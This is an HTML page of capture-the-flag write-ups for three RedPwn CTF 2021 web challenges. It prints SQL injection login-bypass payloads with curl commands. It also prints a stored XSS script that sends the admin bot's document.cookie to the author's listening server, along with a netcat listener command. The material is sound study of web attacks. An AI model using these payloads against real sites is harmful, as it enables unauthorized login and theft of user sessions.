@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>RedPwn CTF 2021 Challenge Writups</title>
+        <style>
+</style>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
+<link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+body{ margin: 0 auto; background: #000; font-family: Georgia, Palatino, serif; color: #EEE; line-height: 1; max-width: 960px; padding: 30px; } h1, h2, h3, h4 { font-weight: 400; } h1, h2, h3, h4, h5, p { margin-bottom: 24px; padding: 0; } h1 { font-size: 48px; } h2 { font-size: 36px; margin: 24px 0 6px; } h3 { font-size: 24px; } h4 { font-size: 21px; } h5 { font-size: 18px; } a { color: #61BFC1; margin: 0; padding: 0; text-decoration: none; vertical-align: baseline; } a:hover { text-decoration: underline; } a:visited { color: #466B6C; } ul, ol { padding: 0; margin: 0; } li { line-height: 24px; } li ul, li ul { margin-left: 24px; } p, ul, ol { font-size: 16px; line-height: 24px; max-width: 540px; } pre { padding: 0px 24px; max-width: 800px; white-space: pre-wrap; } code { font-family: Consolas, Monaco, Andale Mono, monospace; line-height: 1.5; font-size: 13px; } aside { display: block; float: right; width: 390px; } blockquote { border-left:.5em solid #eee; padding: 0 2em; margin-left:0; max-width: 476px; } blockquote cite { font-size:14px; line-height:20px; color:#bfbfbf; } blockquote cite:before { content: '\2014 \00A0'; } blockquote p { color: #666; max-width: 460px; } hr { width: 540px; text-align: left; margin: 0 auto 0 0; color: #999; } /* Code below this line is copyright Twitter Inc. */ button, input, select, textarea { font-size: 100%; margin: 0; vertical-align: baseline; *vertical-align: middle; } button, input { line-height: normal; *overflow: visible; } button::-moz-focus-inner, input::-moz-focus-inner { border: 0; padding: 0; } button, input[type="button"], input[type="reset"], input[type="submit"] { cursor: pointer; -webkit-appearance: button; } input[type=checkbox], input[type=radio] { cursor: pointer; } /* override default chrome & firefox settings */ input:not([type="image"]), textarea { -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; } input[type="search"] { -webkit-appearance: textfield; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; } input[type="search"]::-webkit-search-decoration { -webkit-appearance: none; } label, input, select, textarea { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; font-weight: normal; line-height: normal; margin-bottom: 18px; } input[type=checkbox], input[type=radio] { cursor: pointer; margin-bottom: 0; } input[type=text], input[type=password], textarea, select { display: inline-block; width: 210px; padding: 4px; font-size: 13px; font-weight: normal; line-height: 18px; height: 18px; color: #808080; border: 1px solid #ccc; -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; } select, input[type=file] { height: 27px; line-height: 27px; } textarea { height: auto; } /* grey out placeholders */ :-moz-placeholder { color: #bfbfbf; } ::-webkit-input-placeholder { color: #bfbfbf; } input[type=text], input[type=password], select, textarea { -webkit-transition: border linear 0.2s, box-shadow linear 0.2s; -moz-transition: border linear 0.2s, box-shadow linear 0.2s; transition: border linear 0.2s, box-shadow linear 0.2s; -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1); -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1); box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1); } input[type=text]:focus, input[type=password]:focus, textarea:focus { outline: none; border-color: rgba(82, 168, 236, 0.8); -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); } /* buttons */ button { display: inline-block; padding: 4px 14px; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px; -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); background-color: #0064cd; background-repeat: repeat-x; background-image: -khtml-gradient(linear, left top, left bottom, from(#049cdb), to(#0064cd)); background-image: -moz-linear-gradient(top, #049cdb, #0064cd); background-image: -ms-linear-gradient(top, #049cdb, #0064cd); background-image: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #049cdb), color-stop(100%, #0064cd)); background-image: -webkit-linear-gradient(top, #049cdb, #0064cd); background-image: -o-linear-gradient(top, #049cdb, #0064cd); background-image: linear-gradient(top, #049cdb, #0064cd); color: #fff; text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25); border: 1px solid #004b9a; border-bottom-color: #003f81; -webkit-transition: 0.1s linear all; -moz-transition: 0.1s linear all; transition: 0.1s linear all; border-color: #0064cd #0064cd #003f81; border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25); } button:hover { color: #fff; background-position: 0 -15px; text-decoration: none; } button:active { -webkit-box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05); -moz-box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05); box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05); } button::-moz-focus-inner { padding: 0; border: 0; } 
+</style>
+        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
+        
+    </head>
+    <body class="vscode-body">
+        <h1 id="redpwn-ctf-2021-challenge-writups">RedPwn CTF 2021 Challenge Writups</h1>
+<h2 id="attemptedsolved-challenges">Attempted/Solved Challenges</h2>
+<ul>
+<li>web/inspect-me</li>
+<li>web/orm-bad</li>
+<li>web/secure</li>
+<li>web/pastebin-1</li>
+<li>rev/wstrings</li>
+<li>pwn/beginner-generic-pwn-number-0</li>
+<li>pwn/printf-please</li>
+<li>pwn/ret2generi-flag-reader</li>
+</ul>
+<h2 id="introductory-notes">Introductory Notes</h2>
+<p>RedPwnCTF2021 was a short 3 days Jeopardy Style online CTF hosted from 10th July, 2021 to 13th July, 2021. Our team
+attempted a few problems in the short time and managed to solve all attempted problems. A detailed breakdown of our
+approaches and additional notes we found out later from other writeups are included, along with the challenge files,
+prompts and solution codes.</p>
+<h3 id="weborm-bad">web/orm-bad</h3>
+<hr>
+<h4 id="categeory-web">Categeory: Web</h4>
+<h4 id="difficulty-easy">Difficulty: Easy</h4>
+<h4 id="keywords-sql-injection-javascript-sqlite">Keywords: SQL Injection, Javascript, Sqlite</h4>
+<h4 id="author-therealdarkcoder">Author: TheRealDarkCoder</h4>
+<h4 id="prompt">Prompt:&gt;</h4>
+<pre><code class="language-text"><div>I just learned about orms today! They seem kinda difficult to implement though... Guess I&#x27;ll stick to good old raw sql
+statements!
+
+orm-bad.mc.ax
+
+Included Files: web/SOLVED_orm-bad/app.js
+</div></code></pre>
+<h4 id="overview">Overview</h4>
+<ol>
+<li>
+<p><code>secure.mc.ax</code> is a simple http(s) webserver. The source code is provided (<code>app.js</code>).</p>
+</li>
+<li>
+<p>The website greets us with an authentication page.</p>
+</li>
+</ol>
+<pre><code class="language-html"><div><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Sign in:<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login_form&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>Username: <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password: <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Login&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+</div></code></pre>
+<ol>
+<li>The <code>app.js</code> file is analyzed and we find out the following important attack vector.</li>
+</ol>
+<pre><code class="language-js"><div>app.post(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
+            db.all(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;&quot;</span> + req.body.username + <span class="hljs-string">&quot;&#x27; AND password=&#x27;&quot;</span> + req.body.password + <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-function">(<span class="hljs-params">err, rows</span>) =&gt;</span> {
+                        <span class="hljs-keyword">try</span> {
+                            <span class="hljs-keyword">if</span> (rows.length == <span class="hljs-number">0</span>) {
+                                res.redirect(<span class="hljs-string">&quot;/?alert=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">&quot;you are not admin :(&quot;</span>));
+                            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rows[<span class="hljs-number">0</span>].username === <span class="hljs-string">&quot;admin&quot;</span>) {
+                                res.redirect(<span class="hljs-string">&quot;/?alert=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(flag));
+                            } <span class="hljs-keyword">else</span> {
+                                ...
+</div></code></pre>
+<ol start="4">
+<li>
+<p>The SQL Query is not sanitized and basic SQL Injection techniques are plausible. Our username has to be <code>admin</code>.</p>
+</li>
+<li>
+<p>We pass in the following user inputs:</p>
+</li>
+</ol>
+<pre><code><code><div>username=admin
+password=1' or '1' = '1
+</div></code></code></pre>
+<p>Here the SQL Query would become</p>
+<pre><code class="language-sql"><div>&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&quot;
+</span></div></code></pre>
+<p>...resulting in a <code>True</code> output and giving us authentication to the user. And sure enough, we get an authenticated render of the page and get the flag.</p>
+<ol start="6">
+<li>A simple curl command can also show the redirect url and get the flag, make sure to url decode the string.</li>
+</ol>
+<pre><code class="language-sh"><div>$ curl -d <span class="hljs-string">&quot;username=admin&amp;password=1&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span> -X POST https://orm-bad.mc.ax/flag
+
+Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
+<span class="hljs-comment">#flag{sqli_overused_again_0b4f6}</span>
+</div></code></pre>
+<h4 id="flag-flagsqli_overused_again_0b4f6">Flag: flag{sqli_overused_again_0b4f6}</h4>
+<h3 id="websecure">web/secure</h3>
+<hr>
+<h4 id="categeory-web-1">Categeory: Web</h4>
+<h4 id="difficulty-easy-1">Difficulty: Easy</h4>
+<h4 id="keywords-sql-injection-javascript-sqlite-base64-template-literals">Keywords: SQL Injection, Javascript, Sqlite, Base64, Template Literals</h4>
+<h4 id="author-therealdarkcoder-1">Author: TheRealDarkCoder</h4>
+<h4 id="prompt-1">Prompt:&gt;</h4>
+<pre><code><code><div>Just learned about encryption—now, my website is unhackable!
+
+secure.mc.ax
+</div></code></code></pre>
+<h4 id="overview-1">Overview:&gt;</h4>
+<ol>
+<li>Upon visiting the website, we get a similar authentication page as web/orm-bad. A source file is given (<code>web/SOLVED_secure/index.js</code>)</li>
+</ol>
+<pre><code class="language-html"><div>
+  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Sign In<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;important&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+    (<span class="hljs-keyword">async</span>() =&gt; {
+      <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, resolve));
+      <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;form&#x27;</span>).addEventListener(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
+        e.preventDefault();
+        <span class="hljs-keyword">const</span> form = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;form&#x27;</span>);
+        form.setAttribute(<span class="hljs-string">&#x27;method&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>);
+        form.setAttribute(<span class="hljs-string">&#x27;action&#x27;</span>, <span class="hljs-string">&#x27;/login&#x27;</span>);
+
+        <span class="hljs-keyword">const</span> username = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>);
+        username.setAttribute(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>);
+        username.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>,
+          btoa(<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#username&#x27;</span>).value)
+        );
+
+        <span class="hljs-keyword">const</span> password = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>);
+        password.setAttribute(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);
+        password.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>,
+          btoa(<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#password&#x27;</span>).value)
+        );
+
+        form.appendChild(username);
+        form.appendChild(password);
+
+        form.setAttribute(<span class="hljs-string">&#x27;style&#x27;</span>, <span class="hljs-string">&#x27;display: none&#x27;</span>);
+
+        <span class="hljs-built_in">document</span>.body.appendChild(form);
+        form.submit();
+      });
+    })();
+
+  
+</span></div></code></pre>
+<ol start="2">
+<li>We first see an attack vector in database initiation</li>
+</ol>
+<pre><code class="language-javascript"><div><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+
+<span class="hljs-keyword">const</span> db = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;better-sqlite3&#x27;</span>)(<span class="hljs-string">&#x27;db.sqlite3&#x27;</span>);
+db.exec(<span class="hljs-string">`DROP TABLE IF EXISTS users;`</span>);
+db.exec(<span class="hljs-string">`CREATE TABLE users(
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT,
+    password TEXT
+);`</span>);
+db.exec(<span class="hljs-string">`INSERT INTO users (username, password) VALUES (
+    &#x27;<span class="hljs-subst">${btoa(<span class="hljs-string">&#x27;admin&#x27;</span>)}</span>&#x27;,
+    &#x27;<span class="hljs-subst">${btoa(crypto.randomUUID)}</span>&#x27;
+)`</span>);
+</div></code></pre>
+<p>We see that depreciated function <code>btoa()</code> is used.</p>
+<ol start="3">
+<li>In the front end client, we see the async function used to submit the form data. We see the snippet</li>
+</ol>
+<pre><code class="language-javascript"><div>username.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>,
+          btoa(<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#username&#x27;</span>).value)
+        );
+</div></code></pre>
+<ol start="4">
+<li>
+<p>The POST data is also converted to base64 using btoa().</p>
+</li>
+<li>
+<p>However, if we analyze the backend code even more, we see the login handling snippet</p>
+</li>
+</ol>
+<pre><code class="language-javascript"><div><span class="hljs-keyword">const</span> query = <span class="hljs-string">`SELECT id FROM users WHERE
+          username = &#x27;<span class="hljs-subst">${req.body.username}</span>&#x27; AND
+          password = &#x27;<span class="hljs-subst">${req.body.password}</span>&#x27;;`</span>;
+  <span class="hljs-keyword">try</span> {
+    <span class="hljs-keyword">const</span> id = db.prepare(query).get()?.id;
+</div></code></pre>
+<p>Here Javascript ES6 Template literals are used to pass in the user data (which is already base64 encoded from client side). But ES6 Template literals won't save one from SQL Injection. So all we have to do is keep the username a base64 encode of <code>admin</code> and the password an SQLI payload (<code>1' or '1'='1'</code>) like the previous challenge.</p>
+<ol start="6">
+<li>The following curl post request works just fine</li>
+</ol>
+<pre><code class="language-sh"><div>$ curl -d <span class="hljs-string">&quot;username=YWRtaW4=&amp;password=1&#x27; or &#x27;1&#x27; = &#x27;1&quot;</span> -X POST https://secure.mc.ax/login
+
+Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
+<span class="hljs-comment">#flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</span>
+</div></code></pre>
+<h4 id="flag-flag50m37h1n6_50m37h1n6_cl13n7_n07_600d">Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</h4>
+<h3 id="webpastebin-1">web/pastebin-1</h3>
+<hr>
+<h4 id="categeory-web-2">Categeory: Web</h4>
+<h4 id="difficulty-medium">Difficulty: Medium</h4>
+<h4 id="keywords-xss-cookie-hijacking">Keywords: XSS, Cookie Hijacking</h4>
+<h4 id="author-therealdarkcoder-2">Author: TheRealDarkCoder</h4>
+<h4 id="prompt-2">Prompt:&gt;</h4>
+<pre><code><code><div>Ah, the classic pastebin. Can you get the admin's cookies?
+
+pastebin-1.mc.ax
+
+Admin bot: https://admin-bot.mc.ax/pastebin-1
+</div></code></code></pre>
+<h4 id="overview-2">Overview:&gt;</h4>
+<ol>
+<li>
+<p>As the prompt suggests, it is indeed a classic challenge. Upon visiting the website we find a input field which allows us to input any text, and then it stores the text somewhere and gives us a URL which we can use to view the text in the future, hence the name pastebin. The prompt also gives us a link to an admin bot page. The idea is that the admin bot also has a input field which takes the url of any pastebin link. Upon giving the link, the bot visits the link and reads the paste.</p>
+</li>
+<li>
+<p>The backend is written in rust and provided to us (<code>web/SOLVED_pastebin-1/main.rs</code>). However I'm very rusty in rust (pun intended) so I decided not to bother with it, and instead try a classic XSS check. So I created a paste with the content</p>
+</li>
+</ol>
+<pre><code class="language-js"><div>&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;
+</div></code></pre>
+<p>...and sure enough, we have XSS as an alert pops up.</p>
+<ol start="3">
+<li>On my remote server I open up a port using netcat</li>
+</ol>
+<pre><code class="language-sh"><div>nc -lvpn 1337
+</div></code></pre>
+<p>... <em>The server is not behind a NAT as it's my test lab so it is publicly accesible. However I would not recommend using your own home computers instead use online services like <a href="https://hookbin.com">hookbin</a> which gives you a free http endpoint (Thanks to <a href="https://blog.pipeframe.xyz/post/redpwn2021">a writeup here</a>)</em></p>
+<ol start="4">
+<li>I create a simple cookie hijacking XSS script which takes the <code>document.cookie</code> and submits it as a get request parameter to my server</li>
+</ol>
+<pre><code class="language-html"><div><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;img src=&quot;http://XX.XX.XX.XX:1337/?cookie=&#x27;</span> + <span class="hljs-built_in">document</span>.cookie + <span class="hljs-string">&#x27;&quot; /&gt;&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</div></code></pre>
+<p>This XSS script will try to add a image to the DOM. The source of the image is a link to our attacker server where the <code>document.cookie</code> is sent along with a GET parameter in the URL. So when the browser (in this case the admin bot) tries to load in the image, it sends a GET request to the image source along with the cookie.</p>
+<ol start="5">
+<li>We create the paste and pass the link to the admin bot. The admin bot visits the link and we get the following http request at our server</li>
+</ol>
+<pre><code class="language-http"><div><span class="hljs-attribute">Connection from [REDACTED]:36854
+GET /?cookie=flag=flag{d1dn7_n33d_70_b3_1n_ru57} HTTP/1.1
+Host</span>: [REDACTED]:1337
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.148 Safari/537.36
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate, br
+
+</div></code></pre>
+<ol start="6">
+<li>The cookie is the flag itself, no need to authenticate as admin.</li>
+</ol>
+<h4 id="flag-flagd1dn7_n33d_70_b3_1n_ru57">Flag: flag{d1dn7_n33d_70_b3_1n_ru57}</h4>
+
+    </body>
+    </html>
